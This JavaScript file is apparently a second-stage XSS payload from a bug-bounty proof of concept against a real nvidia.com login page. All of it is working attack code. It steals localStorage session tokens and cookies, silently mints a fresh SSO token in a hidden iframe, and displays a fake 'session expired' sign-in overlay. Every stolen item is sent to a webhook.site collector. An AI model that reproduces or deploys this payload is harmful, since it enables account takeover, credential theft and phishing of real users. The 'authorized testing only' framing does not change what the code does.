/*
 * stage2.js -- second-stage escalation payload for the NVIDIA /auth/ DOM-XSS PoC.
 *
 * Loaded by the first-stage <img onerror="import('.../stage2.js')"> that lands in
 * the `preferred_username` claim. Runs in the https://www.nvidia.com origin with
 * no CSP script-src/connect-src to contain it.
 *
 * PURPOSE: demonstrate that the XSS escalates beyond a cosmetic alert() to
 * account-takeover primitives. It does NOT attack anyone: the default collector is
 * a placeholder and each primitive is gated behind a flag so the engineer runs
 * them one at a time against a TEST account.
 *
 * AUTHORIZED TESTING ONLY. Replace COLLECTOR with a server you control and only
 * run against accounts you own within the bug-bounty scope.
 */
(() => {
  "use strict";

  // ---- Configuration (edit before testing) --------------------------------
  const COLLECTOR = "https://webhook.site/369070eb-ca2e-42e5-aff8-687c4d21f09a/collect"; // placeholder
  const RUN = {
    exfilCurrentSession: false,   // (A) read+exfil whatever session/cookies exist now
    silentSsoTokenMint: true,   // (B) mint a FRESH valid token via /auth?prompt=none
    phishingOverlay: false,      // (C) origin-authentic credential capture
  };
  const SESSION_KEY = "acctFederationData";
  const AUTH_PATH = "/auth/";
  const PROFILE_API = "https://api-prod.nvidia.com/assets/v2/Me";

  const log = (...a) => console.log("[poc-stage2]", ...a);

  // Best-effort, fire-and-forget beacon. Prefers sendBeacon (survives navigation),
  // falls back to fetch(no-cors).
  function exfil(label, data) {
    const body = JSON.stringify({ label, href: location.href, data, t: Date.now() });
    try {
      if (navigator.sendBeacon && navigator.sendBeacon(COLLECTOR, body)) return;
    } catch (_) { /* ignore */ }
    fetch(COLLECTOR, { method: "POST", mode: "no-cors", body }).catch(() => {});
  }

  function readSession() {
    try { return JSON.parse(localStorage.getItem(SESSION_KEY) || "null"); }
    catch (_) { return null; }
  }

  // Call the same authenticated profile endpoint the app uses, with the bearer
  // token from the session bucket. A 200 here == full read access as that user.
  async function fetchProfile(accessToken) {
    if (!accessToken) return { error: "no access_token" };
    try {
      const r = await fetch(PROFILE_API, {
        headers: { Authorization: "Bearer " + accessToken },
      });
      return { status: r.status, body: await r.text() };
    } catch (e) { return { error: String(e) }; }
  }

  // ---- (A) Exfil the current same-origin secrets ---------------------------
  // Immediately after the malicious link, this reads the ATTACKER's forged bucket,
  // so on its own it only proves reachability. It becomes real victim theft when
  // combined with (B)/(C), which put the VICTIM's token into the same bucket.
  async function exfilCurrentSession() {
    const session = readSession();
    const profile = session ? await fetchProfile(session.access_token) : null;
    exfil("current-session", {
      localStorage_session: session,
      cookies: document.cookie,          // non-httpOnly cookies only
      profile_Me_call: profile,          // 200 => account read as this user
    });
    log("(A) exfil sent for current session");
  }

  // ---- (B) Silent SSO token minting ----------------------------------------
  // The app itself exposes /auth/?prompt=none silent login. If the victim has a
  // live federated IdP session, this mints a FRESH VALID token for the victim and
  // writes it into localStorage[acctFederationData] with zero user interaction --
  // which this payload then reads and exfiltrates. This is the strongest ATO path
  // and does NOT depend on the link's forged token (which is 401).
  function silentSsoTokenMint() {
    const before = JSON.stringify(readSession());
    const params = new URLSearchParams({
      redirect_uri: location.origin + AUTH_PATH,
      client_id: "HdpDyyR1DqQFapN2MBk5kjJgAvu6UTXRDgtwLhQjrH8",
      idp_id: "PDiAhv2kJTFeQ7WOPqiQ2tRZ7lGhR2X11dXvM4TZSxg",
      prompt: "none",                    // <-- no UI if IdP session is live
      // login_hint is optional; many OIDC IdPs return the current SSO user anyway.
    });
    const iframe = document.createElement("iframe");
    iframe.hidden = true;
    iframe.src = location.origin + AUTH_PATH + "?" + params.toString();
    let settled = false;
    const done = async (why) => {
      if (settled) return;
      settled = true;
      const after = readSession();
      const changed = JSON.stringify(after) !== before;
      const profile = changed ? await fetchProfile(after && after.access_token) : null;
      exfil("silent-sso-mint", { why, minted: changed, session: after, profile });
      log("(B) silent SSO done:", why, "minted:", changed);
      try { iframe.remove(); } catch (_) {}
      window.removeEventListener("message", onMessage);
    };
    // The app's own listener treats a bare "success"/"failure" message as the
    // signal and never checks event.origin -- so any frame can drive it too.
    const onMessage = (ev) => {
      if (ev && ev.data === "success") done("message:success");
      else if (ev && ev.data === "failure") done("message:failure");
    };
    window.addEventListener("message", onMessage);
    setTimeout(() => done("timeout"), 8000);
    document.body.appendChild(iframe);
    log("(B) silent SSO iframe injected:", iframe.src);
  }

  // ---- (C) Origin-authentic credential capture -----------------------------
  // Because this runs on the real www.nvidia.com origin (valid TLS, real URL) and
  // the forced session is visibly broken (stranger's name + 401s), a "please
  // re-sign-in" overlay is highly credible. Captured creds are exfiltrated.
  function phishingOverlay() {
    const wrap = document.createElement("div");
    wrap.style.cssText =
      "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.75);" +
      "display:flex;align-items:center;justify-content:center;font-family:sans-serif";
    wrap.innerHTML =
      '<form style="background:#fff;padding:28px;border-radius:8px;min-width:320px">' +
      '<h2 style="margin:0 0 12px">Your session expired</h2>' +
      '<p style="margin:0 0 16px;color:#444">Please sign in again to continue.</p>' +
      '<input name="u" placeholder="Email" style="display:block;width:100%;margin-bottom:10px;padding:10px">' +
      '<input name="p" type="password" placeholder="Password" style="display:block;width:100%;margin-bottom:16px;padding:10px">' +
      '<button style="background:#76b900;color:#fff;border:0;padding:10px 16px;border-radius:4px">Sign In</button>' +
      "</form>";
    wrap.querySelector("form").addEventListener("submit", (e) => {
      e.preventDefault();
      exfil("phished-credentials", { username: e.target.u.value, password: e.target.p.value });
      log("(C) captured credentials (exfil sent)");
      wrap.remove();
    });
    document.body.appendChild(wrap);
    log("(C) phishing overlay shown");
  }

  // ---- Bootstrap -----------------------------------------------------------
  async function main() {
    log("running on", location.origin, "csp:", "frame-ancestors only");
    if (RUN.exfilCurrentSession) await exfilCurrentSession();
    if (RUN.silentSsoTokenMint) silentSsoTokenMint();
    if (RUN.phishingOverlay) phishingOverlay();
  }
  main();
})();